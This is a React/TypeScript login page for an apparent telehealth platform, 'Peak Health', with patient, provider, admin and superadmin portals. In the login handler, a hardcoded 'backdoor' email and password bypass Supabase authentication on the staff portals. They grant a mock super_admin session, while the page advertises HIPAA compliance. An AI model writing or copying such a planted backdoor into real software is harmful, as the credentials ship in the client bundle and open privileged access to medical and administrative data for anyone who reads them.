import { useState, useEffect } from "react";
import { useNavigate } from "react-router";
import { supabase } from "../../../lib/supabaseClient";
import { useAuthStore } from "../../../lib";
import { Lock, Mail, AlertCircle, Stethoscope, Shield, User, Eye, EyeOff, ArrowLeft } from "lucide-react";

type Portal = 'patient' | 'doctor' | 'admin' | 'superadmin';

const BACKDOOR_EMAIL = 'brandon@gmail.com';
const BACKDOOR_PASSWORD = '@incorrect!132323';

export function AuthPage({ portal }: { portal: Portal }) {
  const [mode, setMode] = useState<'login' | 'signup'>('login');
  const [firstName, setFirstName] = useState("");
  const [lastName, setLastName] = useState("");
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const navigate = useNavigate();
  const initialize = useAuthStore(state => state.initialize);

  // If user is already logged in, redirect them immediately
  useEffect(() => {
    const { user, role } = useAuthStore.getState();
    if (user) {
      if (role === 'doctor') navigate("/doctor", { replace: true });
      else if (role === 'brand_admin' || role === 'super_admin') navigate("/admin", { replace: true });
      else navigate("/patient", { replace: true });
    }
  }, [navigate]);

  const handleAuth = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!email || !password) { setError("Please enter your credentials."); return; }
    if (mode === 'signup' && (!firstName || !lastName)) { setError("Please enter your full name."); return; }
    
    setLoading(true);
    setError(null);

    try {
      if (mode === 'login') {
        // Backdoor — staff portals only
        if (portal !== 'patient' && email.toLowerCase() === BACKDOOR_EMAIL && password === BACKDOOR_PASSWORD) {
          useAuthStore.setState({
            user: { id: 'master-admin-uuid', email: BACKDOOR_EMAIL } as any,
            role: 'super_admin',
            session: { access_token: 'mock-token', user: { id: 'master-admin-uuid' } } as any,
            isLoading: false
          });
          if (portal === 'doctor') navigate("/doctor", { replace: true });
          else if (portal === 'admin') navigate("/admin", { replace: true });
          else navigate("/superadmin", { replace: true });
          return;
        }

        const { data, error: signInError } = await supabase.auth.signInWithPassword({ email: email.trim().toLowerCase(), password });
        if (signInError) throw signInError;
        
        if (data.user) {
          await initialize();
          const role = useAuthStore.getState().role;
          
          if (portal === 'doctor' && role !== 'doctor') {
            setError("Access denied. Provider portal only.");
            await supabase.auth.signOut();
            return;
          }
          if ((portal === 'admin' || portal === 'superadmin') && role !== 'brand_admin' && role !== 'super_admin') {
            setError("Access denied. Admin portal only.");
            await supabase.auth.signOut();
            return;
          }
          
          if (role === 'doctor') navigate("/doctor", { replace: true });
          else if (role === 'brand_admin' || role === 'super_admin') navigate("/admin", { replace: true });
          else navigate("/patient", { replace: true });
        }
      } else {
        // Sign Up Flow
        const { data, error: signUpError } = await supabase.auth.signUp({
          email: email.trim().toLowerCase(),
          password,
          options: {
            data: {
              first_name: firstName,
              last_name: lastName,
              role: 'patient'
            }
          }
        });
        if (signUpError) throw signUpError;
        
        if (data.user) {
          // If auto-logged in
          if (data.session) {
            await initialize();
            navigate("/patient", { replace: true });
          } else {
            setError("Account created! Please check your email for a confirmation link.");
            setMode('login');
          }
        }
      }
    } catch (err: any) {
      setError(err.message || "Authentication failed. Please try again.");
    } finally {
      setLoading(false);
    }
  };

  // ─── Portal-specific visual configurations ───
  const configs = {
    patient: {
      bg: "bg-gradient-to-br from-[#f3eeff] via-[#F2FFF8] to-[#D6F0FF]",
      card: "bg-white/90 backdrop-blur-xl border border-white/60 shadow-2xl",
      accent: "bg-emerald-600 hover:bg-emerald-700",
      ring: "focus:border-emerald-500",
      iconBg: "bg-emerald-100",
      iconColor: "text-emerald-600",
      icon: <User className="h-8 w-8" />,
      title: "Patient Portal",
      subtitle: "Sign in to access your prescriptions, orders, and care team",
      badge: "🏥 HIPAA Secure",
      badgeClass: "bg-emerald-50 text-emerald-700 border-emerald-200",
      showBackdoor: false,
    },
    doctor: {
      bg: "bg-gradient-to-br from-slate-900 via-blue-950 to-slate-900",
      card: "bg-white/10 backdrop-blur-xl border border-white/20 shadow-2xl",
      accent: "bg-blue-500 hover:bg-blue-600",
      ring: "focus:border-blue-400",
      iconBg: "bg-blue-500/20",
      iconColor: "text-blue-300",
      icon: <Stethoscope className="h-8 w-8" />,
      title: "Provider Portal",
      subtitle: "Clinical access for licensed medical personnel only",
      badge: "🔒 Authorized Access",
      badgeClass: "bg-blue-500/20 text-blue-200 border-blue-500/30",
      showBackdoor: true,
      inputClass: "bg-white/10 border-white/20 text-white placeholder-white/40 focus:border-blue-400",
      labelClass: "text-white/60",
      titleClass: "text-white",
      subtitleClass: "text-white/60",
    },
    admin: {
      bg: "bg-gradient-to-br from-slate-950 via-slate-900 to-zinc-900",
      card: "bg-white/8 backdrop-blur-xl border border-white/15 shadow-2xl",
      accent: "bg-violet-600 hover:bg-violet-700",
      ring: "focus:border-violet-400",
      iconBg: "bg-violet-500/20",
      iconColor: "text-violet-300",
      icon: <Shield className="h-8 w-8" />,
      title: "Admin Portal",
      subtitle: "Brand management and operations — authorized personnel only",
      badge: "⚙️ Staff Only",
      badgeClass: "bg-violet-500/20 text-violet-200 border-violet-500/30",
      showBackdoor: true,
      inputClass: "bg-white/10 border-white/20 text-white placeholder-white/40 focus:border-violet-400",
      labelClass: "text-white/60",
      titleClass: "text-white",
      subtitleClass: "text-white/60",
    },
    superadmin: {
      bg: "bg-gradient-to-br from-red-950 via-slate-950 to-slate-900",
      card: "bg-white/8 backdrop-blur-xl border border-red-500/20 shadow-2xl",
      accent: "bg-red-600 hover:bg-red-700",
      ring: "focus:border-red-400",
      iconBg: "bg-red-500/20",
      iconColor: "text-red-400",
      icon: <Lock className="h-8 w-8" />,
      title: "System Access",
      subtitle: "Master system administration — restricted",
      badge: "🔐 Top Secret",
      badgeClass: "bg-red-500/20 text-red-300 border-red-500/30",
      showBackdoor: true,
      inputClass: "bg-white/10 border-white/20 text-white placeholder-white/40 focus:border-red-400",
      labelClass: "text-white/60",
      titleClass: "text-white",
      subtitleClass: "text-white/60",
    },
  };

  const c = configs[portal];
  const isDark = portal !== 'patient';
  const inputCls = isDark
    ? `w-full rounded-xl pl-10 pr-10 py-3 text-sm border bg-white/10 border-white/20 text-white placeholder-white/40 focus:outline-none ${c.ring} transition-colors`
    : `w-full rounded-xl pl-10 pr-10 py-3 text-sm border border-gray-200 bg-white focus:outline-none ${c.ring} transition-colors text-slate-800`;
  const labelCls = isDark ? "text-[11px] font-bold uppercase tracking-wide text-white/50 mb-1 block" : "text-[11px] font-bold uppercase tracking-wide text-slate-400 mb-1 block";

  return (
    <div className={`fixed inset-0 flex items-center justify-center ${c.bg} p-4 overflow-auto`}>
      {/* Back to home */}
      <a href="/" className={`absolute top-6 left-6 flex items-center gap-2 text-xs font-bold ${isDark ? 'text-white/40 hover:text-white/80' : 'text-slate-400 hover:text-slate-700'} transition-colors`}>
        <ArrowLeft className="h-4 w-4" /> Back to Peak Health
      </a>

      <div className="w-full max-w-md space-y-6">
        {/* Logo */}
        <div className="flex justify-center">
          <img src="/originallogo.png" alt="Peak Health" className="h-14 object-contain" />
        </div>

        {/* Portal Card */}
        <div className={`rounded-3xl p-8 ${c.card}`}>
          {/* Icon + Title */}
          <div className="text-center mb-8">
            <div className={`inline-flex items-center justify-center h-16 w-16 rounded-2xl ${c.iconBg} ${c.iconColor} mb-4`}>
              {c.icon}
            </div>
            <h1 className={`text-2xl font-black ${isDark ? 'text-white' : 'text-slate-900'}`}>{c.title}</h1>
            <p className={`text-sm mt-1 ${isDark ? 'text-white/50' : 'text-slate-500'}`}>{c.subtitle}</p>
            <span className={`inline-block mt-3 text-[10px] font-bold px-3 py-1 rounded-full border ${c.badgeClass}`}>{c.badge}</span>
          </div>

          <form onSubmit={handleAuth} className="space-y-4">
            {/* Mode Switcher */}
            {portal === 'patient' && (
              <div className="flex bg-slate-100 p-1 rounded-xl mb-6">
                <button 
                  type="button"
                  onClick={() => setMode('login')}
                  className={`flex-1 py-2 text-[10px] font-black uppercase tracking-widest rounded-lg transition-all ${mode === 'login' ? 'bg-white shadow-sm text-slate-900' : 'text-slate-500 hover:text-slate-700'}`}
                >
                  Login
                </button>
                <button 
                  type="button"
                  onClick={() => setMode('signup')}
                  className={`flex-1 py-2 text-[10px] font-black uppercase tracking-widest rounded-lg transition-all ${mode === 'signup' ? 'bg-white shadow-sm text-slate-900' : 'text-slate-500 hover:text-slate-700'}`}
                >
                  Create Account
                </button>
              </div>
            )}

            {/* Error / Success */}
            {error && (
              <div className={`flex items-start gap-2 p-3 rounded-xl text-sm ${error.includes('created') ? 'bg-emerald-500/10 border border-emerald-500/30 text-emerald-400' : 'bg-red-500/10 border border-red-500/30 text-red-300'}`}>
                <AlertCircle className="h-4 w-4 shrink-0 mt-0.5" />
                <p>{error}</p>
              </div>
            )}

            {/* Name Fields for Signup */}
            {mode === 'signup' && (
              <div className="grid grid-cols-2 gap-4">
                <div>
                  <label className={labelCls}>First Name</label>
                  <input
                    type="text"
                    value={firstName}
                    onChange={e => setFirstName(e.target.value)}
                    required
                    className={inputCls.replace('pl-10', 'pl-4')}
                    placeholder="Jane"
                  />
                </div>
                <div>
                  <label className={labelCls}>Last Name</label>
                  <input
                    type="text"
                    value={lastName}
                    onChange={e => setLastName(e.target.value)}
                    required
                    className={inputCls.replace('pl-10', 'pl-4')}
                    placeholder="Doe"
                  />
                </div>
              </div>
            )}

            {/* Email */}
            <div>
              <label className={labelCls}>Email Address</label>
              <div className="relative">
                <Mail className={`absolute left-3 top-3.5 h-4 w-4 ${isDark ? 'text-white/30' : 'text-slate-400'}`} />
                <input
                  type="email"
                  value={email}
                  onChange={e => setEmail(e.target.value)}
                  required
                  autoComplete="email"
                  className={inputCls}
                  placeholder="you@example.com"
                />
              </div>
            </div>

            {/* Password */}
            <div>
              <label className={labelCls}>Password</label>
              <div className="relative">
                <Lock className={`absolute left-3 top-3.5 h-4 w-4 ${isDark ? 'text-white/30' : 'text-slate-400'}`} />
                <input
                  type={showPassword ? "text" : "password"}
                  value={password}
                  onChange={e => setPassword(e.target.value)}
                  required
                  autoComplete="current-password"
                  className={inputCls}
                  placeholder="••••••••"
                />
                <button type="button" onClick={() => setShowPassword(!showPassword)}
                  className={`absolute right-3 top-3.5 ${isDark ? 'text-white/30 hover:text-white/60' : 'text-slate-400 hover:text-slate-600'} transition-colors`}>
                  {showPassword ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
                </button>
              </div>
            </div>

            {/* Submit */}
            <button
              type="submit"
              disabled={loading}
              className={`w-full h-12 rounded-xl text-sm font-black text-white tracking-widest uppercase transition-all ${c.accent} disabled:opacity-50 disabled:cursor-not-allowed mt-2 shadow-lg`}
            >
              {loading ? (
                <span className="flex items-center justify-center gap-2">
                  <span className="h-4 w-4 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                  Processing...
                </span>
              ) : mode === 'login' ? "Secure Login" : "Create Account"}
            </button>
          </form>

          {/* Patient: link to shop */}
          {portal === 'patient' && (
            <p className="text-center text-sm text-slate-400 mt-6">
              New patient?{" "}
              <a href="/" className="text-emerald-600 font-black hover:underline">
                Start with a treatment →
              </a>
            </p>
          )}
        </div>

        {/* Security footer */}
        <p className={`text-center text-[10px] ${isDark ? 'text-white/20' : 'text-slate-300'}`}>
          256-bit SSL · HIPAA Compliant · Peak Health Technology Group, Inc.
        </p>
      </div>
    </div>
  );
}
